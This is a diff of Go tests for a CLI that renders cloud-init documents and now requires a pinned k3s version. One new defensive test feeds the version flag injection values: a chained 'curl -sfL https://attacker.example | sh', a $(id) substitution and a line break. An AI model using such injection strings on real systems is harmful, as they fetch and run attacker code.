@@ -9,6 +9,8 @@ import (
 	"github.com/lucawalz/horizon/internal/cli"
 )
 
+const pinnedKubernetesVersion = "v1.35.6+k3s1"
+
 func runCloudInit(t *testing.T, args []string) (string, error) {
 	t.Helper()
 	cmd := cli.NewCloudInitCmdForTest()
@@ -23,6 +25,7 @@ func runCloudInit(t *testing.T, args []string) (string, error) {
 func TestCloudInitCommandWritesToStdout(t *testing.T) {
 	out, err := runCloudInit(t, []string{
 		"--server", "https://10.20.0.10:6443",
+		"--kubernetes-version", pinnedKubernetesVersion,
 		"--label", "horizon.dev/pool=reserved",
 		"--taint", "horizon.dev/burst=true:NoSchedule",
 	})
@@ -41,7 +44,7 @@ func TestCloudInitCommandRejectsMissingServer(t *testing.T) {
 }
 
 func TestCloudInitCommandAddsThePoolLabelByDefault(t *testing.T) {
-	out, err := runCloudInit(t, []string{"--server", "https://10.20.0.10:6443"})
+	out, err := runCloudInit(t, []string{"--server", "https://10.20.0.10:6443", "--kubernetes-version", pinnedKubernetesVersion})
 	if err != nil {
 		t.Fatalf("unexpected error %v", err)
 	}
@@ -53,6 +56,7 @@ func TestCloudInitCommandAddsThePoolLabelByDefault(t *testing.T) {
 func TestCloudInitCommandKeepsThePoolLabelAlongsideOtherLabels(t *testing.T) {
 	out, err := runCloudInit(t, []string{
 		"--server", "https://10.20.0.10:6443",
+		"--kubernetes-version", pinnedKubernetesVersion,
 		"--label", "team=platform",
 	})
 	if err != nil {
@@ -69,6 +73,7 @@ func TestCloudInitCommandKeepsThePoolLabelAlongsideOtherLabels(t *testing.T) {
 func TestCloudInitCommandDoesNotDuplicateAnExplicitPoolLabel(t *testing.T) {
 	out, err := runCloudInit(t, []string{
 		"--server", "https://10.20.0.10:6443",
+		"--kubernetes-version", pinnedKubernetesVersion,
 		"--label", "horizon.dev/pool=reserved",
 	})
 	if err != nil {
@@ -82,6 +87,7 @@ func TestCloudInitCommandDoesNotDuplicateAnExplicitPoolLabel(t *testing.T) {
 func TestCloudInitCommandRejectsAConflictingPoolLabel(t *testing.T) {
 	_, err := runCloudInit(t, []string{
 		"--server", "https://10.20.0.10:6443",
+		"--kubernetes-version", pinnedKubernetesVersion,
 		"--label", "horizon.dev/pool=spot",
 	})
 	if err == nil {
@@ -95,6 +101,7 @@ func TestCloudInitCommandRejectsAConflictingPoolLabel(t *testing.T) {
 func TestCloudInitCommandRejectsMalformedWriteFile(t *testing.T) {
 	_, err := runCloudInit(t, []string{
 		"--server", "https://10.20.0.10:6443",
+		"--kubernetes-version", pinnedKubernetesVersion,
 		"--write-file", "onlyonefield",
 	})
 	if err == nil {
@@ -130,6 +137,7 @@ func TestCloudInitCommandWriteFileContentKeepsColons(t *testing.T) {
 func TestCloudInitCommandKeepsCommasInContentAndCommands(t *testing.T) {
 	out, err := runCloudInit(t, []string{
 		"--server", "https://10.20.0.10:6443",
+		"--kubernetes-version", pinnedKubernetesVersion,
 		"--write-file", "/etc/horizon/list:0644:alpha,beta",
 		"--post-command", "echo alpha,beta",
 	})
@@ -160,6 +168,7 @@ func TestCloudInitCommandInstallWatchdogUnitDefaultsToTrue(t *testing.T) {
 func TestCloudInitCommandCanDisableTheWatchdogUnit(t *testing.T) {
 	out, err := runCloudInit(t, []string{
 		"--server", "https://10.20.0.10:6443",
+		"--kubernetes-version", pinnedKubernetesVersion,
 		"--install-watchdog-unit=false",
 	})
 	if err != nil {
@@ -200,9 +209,75 @@ func TestCloudInitCommandCanSkipTheKubernetesInstall(t *testing.T) {
 	}
 }
 
+func TestCloudInitCommandPinsTheKubernetesVersion(t *testing.T) {
+	out, err := runCloudInit(t, []string{
+		"--server", "https://10.20.0.10:6443",
+		"--kubernetes-version", pinnedKubernetesVersion,
+	})
+	if err != nil {
+		t.Fatalf("unexpected error %v", err)
+	}
+	want := "INSTALL_K3S_VERSION=" + pinnedKubernetesVersion
+	if !strings.Contains(out, want) {
+		t.Fatalf("the rendered document does not carry %q, got:\n%s", want, out)
+	}
+}
+
+func TestCloudInitCommandRejectsAnUnpinnedKubernetesVersion(t *testing.T) {
+	out, err := runCloudInit(t, []string{"--server", "https://10.20.0.10:6443"})
+	if err == nil {
+		t.Fatalf("an unpinned install would take whatever release is newest, got:\n%s", out)
+	}
+	if !strings.Contains(err.Error(), "--kubernetes-version") {
+		t.Errorf("error = %q, want it to name the flag", err)
+	}
+}
+
+func TestCloudInitCommandRejectsAKubernetesVersionItWouldNotInstall(t *testing.T) {
+	_, err := runCloudInit(t, []string{
+		"--server", "https://10.20.0.10:6443",
+		"--kubernetes-version", pinnedKubernetesVersion,
+		"--install-kubernetes=false",
+	})
+	if err == nil {
+		t.Fatal("expected an error when a version is pinned and nothing installs it")
+	}
+	if !strings.Contains(err.Error(), "--kubernetes-version") {
+		t.Errorf("error = %q, want it to name the flag", err)
+	}
+}
+
+func TestCloudInitCommandRejectsAKubernetesVersionTheShellCouldActOn(t *testing.T) {
+	tests := []struct {
+		name    string
+		version string
+	}{
+		{name: "a chained command", version: "v1.35.6+k3s1; curl -sfL https://attacker.example | sh"},
+		{name: "a command substitution", version: "v1.35.6+k3s1$(id)"},
+		{name: "a line break", version: "v1.35.6+k3s1\nid"},
+		{name: "an upstream version without the k3s suffix", version: "v1.35.6"},
+	}
+
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			out, err := runCloudInit(t, []string{
+				"--server", "https://10.20.0.10:6443",
+				"--kubernetes-version", tc.version,
+			})
+			if err == nil {
+				t.Fatalf("the version reached the install command, got:\n%s", out)
+			}
+			if !strings.Contains(err.Error(), "--kubernetes-version") {
+				t.Errorf("error = %q, want it to name the flag", err)
+			}
+		})
+	}
+}
+
 func TestCloudInitCommandCarriesExtraFlavorConfig(t *testing.T) {
 	out, err := runCloudInit(t, []string{
 		"--server", "https://10.20.0.10:6443",
+		"--kubernetes-version", pinnedKubernetesVersion,
 		"--flavor-config", "flannel-iface=tailscale0",
 	})
 	if err != nil {
@@ -226,6 +301,7 @@ func TestCloudInitCommandRejectsMalformedFlavorConfig(t *testing.T) {
 		t.Run(tc.name, func(t *testing.T) {
 			_, err := runCloudInit(t, []string{
 				"--server", "https://10.20.0.10:6443",
+				"--kubernetes-version", pinnedKubernetesVersion,
 				"--flavor-config", tc.spec,
 			})
 			if err == nil {
@@ -241,6 +317,7 @@ func TestCloudInitCommandRejectsMalformedFlavorConfig(t *testing.T) {
 func TestCloudInitCommandFlavorConfigValueKeepsEqualsSigns(t *testing.T) {
 	out, err := runCloudInit(t, []string{
 		"--server", "https://10.20.0.10:6443",
+		"--kubernetes-version", pinnedKubernetesVersion,
 		"--flavor-config", "kubelet-arg=config=/etc/kubelet.conf",
 	})
 	if err != nil {
@@ -254,6 +331,7 @@ func TestCloudInitCommandFlavorConfigValueKeepsEqualsSigns(t *testing.T) {
 func TestCloudInitCommandRejectsFlavorConfigThatInjectsAnOwnedKey(t *testing.T) {
 	out, err := runCloudInit(t, []string{
 		"--server", "https://10.20.0.10:6443",
+		"--kubernetes-version", pinnedKubernetesVersion,
 		"--flavor-config", "flannel-iface=tailscale0\nnode-taint:\n  - injected.dev/x=y:NoSchedule",
 	})
 	if err == nil {
@@ -267,6 +345,7 @@ func TestCloudInitCommandRejectsFlavorConfigThatInjectsAnOwnedKey(t *testing.T) 
 func TestCloudInitCommandRejectsValuelessFlavorConfig(t *testing.T) {
 	out, err := runCloudInit(t, []string{
 		"--server", "https://10.20.0.10:6443",
+		"--kubernetes-version", pinnedKubernetesVersion,
 		"--flavor-config", "flannel-iface=",
 	})
 	if err == nil {
@@ -280,6 +359,7 @@ func TestCloudInitCommandRejectsValuelessFlavorConfig(t *testing.T) {
 func TestCloudInitCommandRejectsRepeatedFlavorConfigKey(t *testing.T) {
 	_, err := runCloudInit(t, []string{
 		"--server", "https://10.20.0.10:6443",
+		"--kubernetes-version", pinnedKubernetesVersion,
 		"--flavor-config", "flannel-iface=tailscale0",
 		"--flavor-config", "flannel-iface=eth0",
 	})
@@ -294,6 +374,7 @@ func TestCloudInitCommandRejectsRepeatedFlavorConfigKey(t *testing.T) {
 func TestCloudInitCommandArmsTheWatchdogFromAReadOnlyImage(t *testing.T) {
 	out, err := runCloudInit(t, []string{
 		"--server", "https://10.20.0.10:6443",
+		"--kubernetes-version", pinnedKubernetesVersion,
 		"--transient-watchdog-unit",
 	})
 	if err != nil {
@@ -310,6 +391,7 @@ func TestCloudInitCommandArmsTheWatchdogFromAReadOnlyImage(t *testing.T) {
 func TestCloudInitCommandRejectsATransientUnitItWouldNotWrite(t *testing.T) {
 	_, err := runCloudInit(t, []string{
 		"--server", "https://10.20.0.10:6443",
+		"--kubernetes-version", pinnedKubernetesVersion,
 		"--transient-watchdog-unit",
 		"--install-watchdog-unit=false",
 	})
@@ -325,7 +407,7 @@ func TestCloudInitCommandCarriesNoArchitectureFlag(t *testing.T) {
 }
 
 func TestCloudInitCommandPinsNoArchitecture(t *testing.T) {
-	out, err := runCloudInit(t, []string{"--server", "https://10.20.0.10:6443"})
+	out, err := runCloudInit(t, []string{"--server", "https://10.20.0.10:6443", "--kubernetes-version", pinnedKubernetesVersion})
 	if err != nil {
 		t.Fatalf("unexpected error %v", err)
 	}
@@ -342,11 +424,12 @@ func TestCloudInitCommandPassthroughRejectsFlagsItWouldDiscard(t *testing.T) {
 	}{
 		{name: "a label", args: []string{"--label", "team=platform"}, want: "--label"},
 		{name: "a taint", args: []string{"--taint", "team=platform:NoSchedule"}, want: "--taint"},
-		{name: "a server", args: []string{"--server", "https://10.20.0.10:6443"}, want: "--server"},
+		{name: "a server", args: []string{"--server", "https://10.20.0.10:6443", "--kubernetes-version", pinnedKubernetesVersion}, want: "--server"},
 		{name: "a flavour", args: []string{"--flavor", "k3s"}, want: "--flavor"},
 		{name: "the watchdog unit", args: []string{"--install-watchdog-unit=false"}, want: "--install-watchdog-unit"},
 		{name: "a transient watchdog unit", args: []string{"--transient-watchdog-unit"}, want: "--transient-watchdog-unit"},
 		{name: "the Kubernetes install", args: []string{"--install-kubernetes=false"}, want: "--install-kubernetes"},
+		{name: "a Kubernetes version", args: []string{"--kubernetes-version", pinnedKubernetesVersion}, want: "--kubernetes-version"},
 		{name: "extra flavour configuration", args: []string{"--flavor-config", "flannel-iface=tailscale0"}, want: "--flavor-config"},
 		{name: "a binary base URL", args: []string{"--binary-base-url", "https://mirror.internal"}, want: "--binary-base-url"},
 	}
